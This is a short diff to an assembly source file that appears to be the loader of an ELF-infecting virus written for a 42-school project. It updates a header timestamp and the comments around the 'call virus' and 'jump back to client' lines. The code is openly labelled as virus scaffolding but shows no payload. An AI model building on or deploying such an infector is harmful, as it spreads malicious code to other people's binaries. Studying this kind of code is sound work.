@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2020/02/22 20:37:25 by ichkamo          ###   ########.fr        ;
+;    Updated: 2020/04/07 20:42:22 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -43,6 +43,7 @@ loader_entry:
 
 ;----------------------------------; launch infection routines
 	call virus
+	; call virus relative addr TODO
 
 ;----------------------------------; restore state, return to client code
 return_to_client:
@@ -63,7 +64,7 @@ return_to_client:
 	pop rcx                    ; restore rcx
 
 jump_back_to_client:
-	jmp 0xffffffff             ; jump back to entry TODO
+	jmp 0xffffffff             ; jump back to entry (done by virus)
 loader_exit:
 
 virus_header_struct:
